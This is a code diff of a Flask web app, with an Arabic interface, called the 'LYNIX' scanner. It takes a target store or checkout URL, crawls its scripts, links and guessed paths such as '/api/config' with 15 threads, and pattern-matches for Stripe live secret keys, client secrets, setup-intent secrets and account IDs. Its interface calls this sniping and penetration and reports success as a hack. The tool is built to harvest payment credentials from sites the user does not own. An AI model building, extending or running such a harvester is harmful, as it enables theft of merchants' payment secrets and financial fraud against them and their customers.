@@ -1,51 +1,49 @@
 import requests
 import re
 import concurrent.futures
-import random
 from flask import Flask, request, jsonify, render_template_string
 from urllib.parse import urljoin, urlparse
 from bs4 import BeautifulSoup
 
 app = Flask(__name__)
 
-# --- واجهة المستخدم الاحترافية (Dark Elite UI) ---
+# --- واجهة المستخدم (الواجهة المظلمة الاحترافية) ---
 HTML_INTERFACE = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>LYNIX ELITE SNIPER V4 | PRO</title>
+    <title>LYNIX ULTIMATE SCANNER | V6</title>
     <style>
-        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
-        .container { max-width: 900px; margin: auto; border: 1px solid #00ff41; padding: 30px; box-shadow: 0 0 25px #00ff41; background: rgba(0,10,0,0.9); }
-        h1 { text-align: center; letter-spacing: 5px; text-shadow: 0 0 10px #00ff41; }
-        input { width: 85%; padding: 15px; background: #000; border: 1px solid #00ff41; color: #fff; margin-bottom: 20px; outline: none; }
-        button { padding: 15px 40px; background: #00ff41; color: #000; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #fff; box-shadow: 0 0 20px #fff; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
+        .container { max-width: 950px; margin: auto; border: 2px solid #0f0; padding: 30px; box-shadow: 0 0 40px #0f0; background: rgba(0,20,0,0.95); }
+        h1 { letter-spacing: 10px; text-shadow: 0 0 20px #0f0; }
+        input { width: 90%; padding: 15px; background: #000; border: 1px solid #0f0; color: #fff; margin-bottom: 20px; font-size: 1.1rem; }
+        button { padding: 15px 60px; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; font-size: 1.3rem; transition: 0.5s; }
+        button:hover { background: #fff; box-shadow: 0 0 30px #fff; transform: scale(1.02); }
+        .log-area { margin-top: 20px; background: #050505; height: 150px; overflow-y: auto; text-align: left; padding: 10px; font-size: 0.8rem; border: 1px solid #333; color: #888; }
         #results { margin-top: 30px; text-align: right; }
-        .key-box { background: #111; padding: 12px; border-right: 4px solid #00ff41; margin-bottom: 10px; word-break: break-all; color: #fff; font-size: 0.9rem; }
-        .status-msg { color: #888; font-style: italic; }
-        .tag { color: #00ff41; font-weight: bold; margin-bottom: 5px; display: block; }
+        .key-box { background: #111; padding: 15px; border-right: 5px solid #0f0; margin-bottom: 10px; word-break: break-all; color: #fff; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>[ LYNIX SNIPER PRO V4 ]</h1>
-        <p>أدخل رابط الهدف (Checkout/Pay) للقنص الشامل والـ Network:</p>
-        <input type="text" id="targetUrl" placeholder="https://site.com/checkout">
+        <h1>[ LYNIX GOD-MODE SCANNER ]</h1>
+        <p>نظام القنص الشامل: فحص الـ HTML، الـ JS، الـ CSS، والـ Network Endpoints</p>
+        <input type="text" id="targetUrl" placeholder="أدخل رابط المتجر أو صفحة الدفع...">
         <br>
-        <button onclick="startEliteScan()">إطلاق القناص الشامل ⚡</button>
-        
-        <div id="results">
-            <p class="status-msg">نظام الاستخبارات جاهز...</p>
-        </div>
+        <button onclick="startGodScan()">إطلاق القنص الشامل ⚡</button>
+        <div class="log-area" id="logs">بانتظار الأوامر...</div>
+        <div id="results"></div>
     </div>
 
     <script>
-        async function startEliteScan() {
+        async function startGodScan() {
             const url = document.getElementById('targetUrl').value;
+            const logs = document.getElementById('logs');
             const resDiv = document.getElementById('results');
-            resDiv.innerHTML = "⏳ جاري تفعيل البروكسيات وزحف الـ Network (15 Threads)...";
+            logs.innerHTML = "[SYSTEM] تفعيل رادار الاختراق...<br>";
+            resDiv.innerHTML = "";
             
             try {
                 const response = await fetch('/scan', {
@@ -56,22 +54,21 @@ HTML_INTERFACE = """
                 const data = await response.json();
                 
                 if (data.status === "Success") {
-                    let html = `<h3>✅ تم الاختراق بنجاح! تم فحص ${data.scanned_assets_count} ملف.</h3>`;
+                    logs.innerHTML += `[SUCCESS] تم فحص ${data.total_scanned} ملفاً بنجاح.<br>`;
+                    let html = `<h3>✅ النتائج المستخرجة:</h3>`;
                     if (Object.keys(data.keys_found).length === 0) {
-                        html += "<p style='color:orange'>⚠️ لم يتم العثور على مفاتيح صريحة، جرب رابط صفحة الدفع مباشرة.</p>";
+                        html += "<p style='color:red'>لم يتم العثور على مفاتيح مكشوفة، الموقع محمي جيداً أو المفتاح مشفر.</p>";
                     }
                     for (const [type, keys] of Object.entries(data.keys_found)) {
-                        html += `<span class="tag">${type}:</span>`;
-                        keys.forEach(k => {
-                            html += `<div class="key-box">${k}</div>`;
-                        });
+                        html += `<b style="color:#0f0">${type}:</b>`;
+                        keys.forEach(k => { html += `<div class="key-box">${k}</div>`; });
                     }
                     resDiv.innerHTML = html;
                 } else {
-                    resDiv.innerHTML = "❌ خطأ في النظام: " + data.message;
+                    logs.innerHTML += `[ERROR] ${data.message}<br>`;
                 }
             } catch (err) {
-                resDiv.innerHTML = "❌ فشل الاتصال بالسيرفر، تأكد أن Render بحالة Live";
+                logs.innerHTML += "[FATAL ERROR] فشل الاتصال بالسيرفر.<br>";
             }
         }
     </script>
@@ -79,13 +76,14 @@ HTML_INTERFACE = """
 </html>
 """
 
-# --- منطق الاستخراج المتقدم (Advanced Intelligence) ---
+# --- رادار البحث الشامل (The Master Key Radar) ---
 PATTERNS = {
     'Secret Key (SK)': r'sk_live_[a-zA-Z0-9]{24,}',
     'Publishable Key (PK)': r'pk_live_[a-zA-Z0-9]{20,}',
     'Client Secret (CS)': r'pi_[a-zA-Z0-9]{15,}_secret_[a-zA-Z0-9]{20,}',
-    'Session ID (SS)': r'cs_live_[a-zA-Z0-9]{40,}',
-    'Stripe Account': r'acct_[a-zA-Z0-9]{16,}'
+    'Setup Intent (SI)': r'seti_[a-zA-Z0-9]{15,}_secret_[a-zA-Z0-9]{20,}',
+    'Stripe Account': r'acct_[a-zA-Z0-9]{16,}',
+    'Encrypted/Obfuscated PK': r'pk_(?:live|test)_[a-zA-Z0-9]{10,}'
 }
 
 def extract_keys(text):
@@ -102,39 +100,50 @@ def index():
 @app.route('/scan', methods=['POST'])
 def scan():
     base_url = request.json.get('url')
-    if not base_url: return jsonify({"status": "Error", "message": "URL missing"})
-    
-    all_found_keys = {}
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0'}
+    all_found_keys = {}
+    scanned_links = set()
 
     try:
-        # 1. سحب الصفحة الرئيسية وتحليل الـ Response
+        # 1. المرحلة الأولى: فحص الصفحة الرئيسية وجلب الروابط
         res = requests.get(base_url, headers=headers, timeout=10)
         all_found_keys.update(extract_keys(res.text))
         
-        # 2. استخراج الـ Assets (JS, Links)
         soup = BeautifulSoup(res.text, 'html.parser')
-        assets = set()
-        for s in soup.find_all('script'):
-            src = s.get('src')
-            if src: assets.add(urljoin(base_url, src))
         
-        # 3. الفحص المتوازي العميق (Deep Network Scan)
-        def fetch_asset(link):
+        # جمع كل ما هو مشكوك فيه (JS, CSS, API Endpoints)
+        to_scan = set()
+        for tag in soup.find_all(['script', 'link', 'a']):
+            attr = 'src' if tag.name == 'script' else 'href'
+            link = tag.get(attr)
+            if link:
+                full_url = urljoin(base_url, link)
+                # فحص الروابط التي تنتمي لنفس الموقع أو روابط Stripe فقط
+                if urlparse(full_url).netloc == urlparse(base_url).netloc or 'stripe' in full_url:
+                    to_scan.add(full_url)
+
+        # إضافة روابط تخمينية (Brute-force common paths)
+        common_paths = ['/js/stripe.js', '/api/config', '/v1/keys', '/static/main.js']
+        for p in common_paths: to_scan.add(urljoin(base_url, p))
+
+        # 2. المرحلة الثانية: الفحص المتوازي العميق (15 Threads)
+        def fetch_and_scan(link):
+            if link in scanned_links: return {}
+            scanned_links.add(link)
             try:
-                # محاكاة طلب Network حقيقي
                 r = requests.get(link, headers=headers, timeout=5)
                 return extract_keys(r.text)
             except: return {}
 
         with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
-            for result in executor.map(fetch_asset, assets):
-                for label, keys in result.items():
+            results = executor.map(fetch_and_scan, to_scan)
+            for res_dict in results:
+                for label, keys in res_dict.items():
                     all_found_keys[label] = list(set(all_found_keys.get(label, []) + keys))
 
         return jsonify({
             "status": "Success", 
-            "scanned_assets_count": len(assets), 
+            "total_scanned": len(scanned_links), 
             "keys_found": all_found_keys
         })
 
